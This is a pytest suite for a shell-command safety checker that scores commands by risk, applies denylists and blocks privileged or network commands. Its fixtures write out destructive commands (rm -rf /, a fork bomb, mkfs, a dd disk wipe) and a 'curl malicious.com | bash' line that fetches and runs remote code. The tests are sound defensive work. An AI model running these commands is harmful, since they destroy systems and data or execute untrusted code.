import pytest
import json
import tempfile
import os
from pathlib import Path
from unittest.mock import patch, MagicMock

from executor.safety_checker import SafetyChecker, RiskLevel, SafetyResult


class TestSafetyChecker:
    """Test suite for SafetyChecker class."""
    
    def setup_method(self):
        """Setup test fixtures before each test."""
        self.checker = SafetyChecker()
        self.custom_config = {
            "block_high_risk": True,
            "block_critical": True,
            "allow_sudo": False,
            "allow_destructive": False,
            "allow_network": True,
            "max_command_length": 500,
            "check_file_paths": True,
            "warn_on_wildcards": True,
            "compliance_mode": True,
        }
        
    def test_check_safe_command(self):
        """Test that safe commands pass all checks."""
        safe_commands = [
            "ls -la",
            "cat file.txt",
            "grep 'pattern' file.txt",
            "echo 'hello world'",
            "ps aux",
            "find . -name '*.py'",
            "tail -f logfile.txt",
            "head -n 10 file.txt"
        ]
        
        for command in safe_commands:
            result = self.checker.check_command(command)
            assert result.is_safe, f"Command '{command}' should be safe but was flagged as unsafe: {result.reason}"
            assert result.risk_level == RiskLevel.LOW.value, f"Command '{command}' should have low risk level"
    
    def test_detect_dangerous_command(self):
        """Test detection of dangerous commands."""
        dangerous_commands = [
            "rm -rf /",
            ":(){:|:&};:",  # fork bomb
            "mkfs /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "shutdown -h now",
            "sudo rm -rf /home/user",
            "chmod 777 /etc/passwd"
        ]
        
        for command in dangerous_commands:
            result = self.checker.check_command(command)
            assert not result.is_safe, f"Command '{command}' should be detected as dangerous"
            assert result.risk_level in [RiskLevel.HIGH.value, RiskLevel.CRITICAL.value], \
                f"Command '{command}' should have high or critical risk level"
    
    @patch('compliance.checker.check_compliance')
    def test_compliance_mode_checks(self, mock_compliance):
        """Test compliance mode functionality."""
        # Setup checker with compliance mode enabled
        config = self.custom_config.copy()
        config['compliance_mode'] = True
        checker = SafetyChecker(config)
        
        # Test compliant command
        mock_compliance.return_value = (True, "Command is compliant")
        result = checker.check_command("ls -la")
        assert result.is_safe
        mock_compliance.assert_called_with("ls -la")
        
        # Test non-compliant command
        mock_compliance.return_value = (False, "Command violates policy XYZ")
        result = checker.check_command("suspicious_command")
        assert not result.is_safe
        assert result.risk_level == RiskLevel.HIGH.value
        assert "Compliance check failed" in result.reason
        
        # Test compliance mode disabled
        config['compliance_mode'] = False
        checker_no_compliance = SafetyChecker(config)
        result = checker_no_compliance.check_command("any_command")
        # Should pass other checks if compliance is disabled
        # (assuming it's not caught by other safety checks)
    
    def test_predictive_risk_assessment_scores(self):
        """Test predictive risk assessment scoring system."""
        # Test low risk commands
        low_risk_commands = [
            "echo hello",
            "ls -la", 
            "cat file.txt"
        ]
        
        for command in low_risk_commands:
            result = self.checker.predictive_risk_assessment(command)
            assert result.is_safe
            assert result.risk_level == RiskLevel.LOW.value
        
        # Test medium risk commands (score 3-4)
        medium_risk_commands = [
            "rm file.txt",  # rm gives +3
            "sudo ls"       # sudo gives +2
        ]
        
        for command in medium_risk_commands:
            result = self.checker.predictive_risk_assessment(command)
            if "rm " in command:
                assert result.risk_level == RiskLevel.MEDIUM.value
            elif "sudo" in command:
                assert result.risk_level == RiskLevel.MEDIUM.value
        
        # Test high risk commands (score 5-7)
        high_risk_commands = [
            "sudo rm file.txt",  # sudo(+2) + rm(+3) = 5
            "mkfs /dev/sda1",     # mkfs gives +5
            "fdisk /dev/sda"      # fdisk gives +5
        ]
        
        for command in high_risk_commands:
            result = self.checker.predictive_risk_assessment(command)
            assert not result.is_safe
            assert result.risk_level == RiskLevel.HIGH.value
        
        # Test critical risk commands (score 8+)
        critical_risk_commands = [
            "sudo mkfs /dev/sda1",        # sudo(+2) + mkfs(+5) = 7, but mkfs alone is 5
            "echo 'test' | sh",           # pipe to sh gives +4
            "curl malicious.com | bash"   # pipe to shell gives +4
        ]
        
        for command in critical_risk_commands:
            result = self.checker.predictive_risk_assessment(command)
            if "|" in command and "sh" in command:
                assert not result.is_safe
                assert result.risk_level == RiskLevel.CRITICAL.value
        
        # Test with context
        context = {"disk_status": {"ok": False}}
        result = self.checker.predictive_risk_assessment("rm file.txt", context)
        # Should add +2 for bad disk status, making rm(+3) + disk(+2) = 5 (high risk)
        assert result.risk_level in [RiskLevel.HIGH.value, RiskLevel.MEDIUM.value]
    
    def test_split_commands_multi_command(self):
        """Test splitting of multi-command strings."""
        # Test simple command separation
        multi_command = "ls -la && cd /tmp ; echo 'done'"
        commands = self.checker.split_commands(multi_command)
        expected = ["ls -la", "cd /tmp", "echo 'done'"]
        assert commands == expected
        
        # Test with pipes
        pipe_command = "ps aux | grep python"
        commands = self.checker.split_commands(pipe_command)
        expected = ["ps aux", "grep python"]
        assert commands == expected
        
        # Test with quoted arguments
        quoted_command = 'echo "hello world" && ls -la'
        commands = self.checker.split_commands(quoted_command)
        expected = ['echo "hello world"', 'ls -la']
        assert commands == expected
        
        # Test empty command
        empty_command = ""
        commands = self.checker.split_commands(empty_command)
        assert commands == []
        
        # Test single command
        single_command = "ls -la"
        commands = self.checker.split_commands(single_command)
        assert commands == ["ls -la"]
        
        # Test complex multi-command with different separators
        complex_command = "cd /tmp && ls -la ; echo 'test' | cat"
        commands = self.checker.split_commands(complex_command)
        expected = ["cd /tmp", "ls -la", "echo 'test'", "cat"]
        assert commands == expected
    
    def test_denylist_blocking(self):
        """Test that denylist patterns are properly blocked."""
        # Create a temporary denylist file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            test_denylist = {
                "critical": ["rm -rf /", ":(){:|:&};:"],
                "high": ["mkfs", "dd of=/dev/sd"],
                "medium": ["shutdown", "reboot"],
                "low": ["pkill", "killall"]
            }
            json.dump(test_denylist, f)
            denylist_path = f.name
        
        try:
            # Mock the denylist loading to use our test file
            with patch.object(Path, 'exists', return_value=True):
                with patch('builtins.open', create=True) as mock_open:
                    mock_open.return_value.__enter__.return_value.read.return_value = json.dumps(test_denylist)
                    checker = SafetyChecker()
            
            # Test critical level blocking
            result = checker.check_command("rm -rf /")
            assert not result.is_safe
            assert result.risk_level == RiskLevel.CRITICAL.value
            assert "rm -rf /" in result.blocked_patterns
            
            # Test high level blocking
            result = checker.check_command("mkfs /dev/sda1")
            assert not result.is_safe
            assert result.risk_level == RiskLevel.HIGH.value
            
            # Test medium level blocking
            result = checker.check_command("shutdown -h now")
            assert not result.is_safe
            assert result.risk_level == RiskLevel.MEDIUM.value
            
            # Test low level blocking
            result = checker.check_command("pkill -f python")
            assert not result.is_safe
            assert result.risk_level == RiskLevel.LOW.value
            
        finally:
            # Clean up temporary file
            os.unlink(denylist_path)
    
    def test_allowlist_passing(self):
        """Test that allowed commands pass through safely."""
        # Test with permissive configuration
        permissive_config = {
            "block_high_risk": False,
            "block_critical": False,
            "allow_sudo": True,
            "allow_destructive": True,
            "allow_network": True,
            "max_command_length": 2000,
            "check_file_paths": False,
            "warn_on_wildcards": False,
            "compliance_mode": False,
        }
        
        permissive_checker = SafetyChecker(permissive_config)
        
        # Commands that would normally be blocked
        allowed_commands = [
            "sudo ls -la",
            "rm temp_file.txt",
            "curl https://example.com",
            "ssh user@server",
            "chmod 755 script.sh"
        ]
        
        for command in allowed_commands:
            result = permissive_checker.check_command(command)
            # These might still be blocked by denylist, but should pass other checks
            if not result.is_safe:
                # Check if it's only blocked by denylist
                assert "denylist" in result.reason.lower() or "dangerous" in result.reason.lower()
    
    def test_command_length_limits(self):
        """Test command length validation."""
        # Test with default limit
        long_command = "echo " + "a" * 1000
        result = self.checker.check_command(long_command)
        assert not result.is_safe
        assert "too long" in result.reason
        
        # Test with custom limit
        custom_checker = SafetyChecker({"max_command_length": 50})
        medium_command = "echo " + "a" * 50
        result = custom_checker.check_command(medium_command)
        assert not result.is_safe
        assert "too long" in result.reason
    
    def test_empty_command_handling(self):
        """Test handling of empty or whitespace-only commands."""
        empty_commands = ["", "   ", "\t", "\n"]
        
        for command in empty_commands:
            result = self.checker.check_command(command)
            assert not result.is_safe
            assert result.risk_level == RiskLevel.MEDIUM.value
            assert "Empty command" in result.reason
    
    def test_syntax_validation(self):
        """Test command syntax validation."""
        # Test valid syntax
        valid_commands = [
            "ls -la",
            "echo 'hello world'",
            'grep "pattern" file.txt'
        ]
        
        for command in valid_commands:
            is_valid, msg = self.checker.validate_command_syntax(command)
            assert is_valid
            assert msg == "Syntax OK"
        
        # Test invalid syntax
        invalid_commands = [
            "echo 'unclosed quote",
            'echo "another unclosed quote',
            "echo 'mixed quotes\""
        ]
        
        for command in invalid_commands:
            is_valid, msg = self.checker.validate_command_syntax(command)
            assert not is_valid
            assert msg != "Syntax OK"
    
    def test_file_path_checking(self):
        """Test critical file path detection."""
        critical_path_commands = [
            "rm /etc/passwd",
            "chmod 777 /boot/vmlinuz",
            "dd if=/dev/zero of=/usr/bin/ls",
            "mv /lib/libc.so.6 /tmp/",
            "touch /sbin/init"
        ]
        
        for command in critical_path_commands:
            result = self.checker.check_command(command)
            assert not result.is_safe
            assert result.risk_level == RiskLevel.HIGH.value
            assert "critical path" in result.reason
    
    def test_wildcard_warnings(self):
        """Test wildcard usage warnings."""
        wildcard_commands = [
            "rm *.txt",
            "chmod 755 *.sh",
            "chown user:group *"
        ]
        
        for command in wildcard_commands:
            result = self.checker.check_command(command)
            # Wildcards should generate warnings but may still be safe
            if result.is_safe:
                assert result.risk_level == RiskLevel.MEDIUM.value
                assert "Wildcard" in result.reason
    
    def test_privilege_command_detection(self):
        """Test detection of privilege escalation commands."""
        privilege_commands = [
            "sudo ls",
            "su root",
            "mount /dev/sda1 /mnt",
            "systemctl restart apache2",
            "useradd newuser"
        ]
        
        for command in privilege_commands:
            result = self.checker.check_command(command)
            assert not result.is_safe
            assert result.risk_level == RiskLevel.HIGH.value
            assert any(term in result.reason for term in ["sudo", "Privileged", "blocked"])
    
    def test_network_command_detection(self):
        """Test network command detection with different configurations."""
        # Test with network commands allowed (default)
        network_commands = ["curl https://example.com", "wget file.txt", "ssh user@host"]
        
        for command in network_commands:
            result = self.checker.check_command(command)
            # Should pass network check but might fail other checks
            if not result.is_safe:
                assert "Network command blocked" not in result.reason
        
        # Test with network commands blocked
        no_network_config = self.custom_config.copy()
        no_network_config['allow_network'] = False
        no_network_checker = SafetyChecker(no_network_config)
        
        for command in network_commands:
            result = no_network_checker.check_command(command)
            assert not result.is_safe
            assert result.risk_level == RiskLevel.MEDIUM.value
            assert "Network command blocked" in result.reason
    
    def test_dangerous_pattern_detection(self):
        """Test detection of dangerous shell patterns."""
        dangerous_patterns = [
            ":(){:|:&};:",  # fork bomb
            "while true; do echo 'infinite loop'; done",
            "yes | command"
        ]
        
        for command in dangerous_patterns:
            result = self.checker.check_command(command)
            assert not result.is_safe
            assert result.risk_level == RiskLevel.CRITICAL.value
            assert "dangerous" in result.reason.lower()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])